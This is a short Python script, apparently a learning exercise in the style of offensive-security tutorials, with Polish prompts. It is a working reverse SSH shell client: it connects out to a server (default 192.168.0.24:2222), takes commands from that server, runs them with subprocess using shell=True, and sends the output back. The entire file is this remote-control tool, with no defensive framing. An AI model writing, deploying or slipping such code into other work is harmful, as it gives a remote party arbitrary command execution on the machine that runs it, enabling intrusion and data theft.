import sys

import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(cmd)
        print(ssh_session.recv(1024).decode())
        while True:
            cmd = ssh_session.recv(1024)
            try:
                cmd = cmd.decode()
                if cmd == "exit":
                    client.close()
                    break
                cmd_output = subprocess.check_output(cmd, shell=True)
                ssh_session.send(cmd_output or "OK")
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass

    user = input('Nazwa uzytkownika: ')
    password = getpass.getpass("Podaj haslo: ")
    ip = input("Adres serwera: ") or "192.168.0.24"
    port = input("Port serwera: ") or 2222

    ssh_command(ip, port, user, password, "ClientConnected")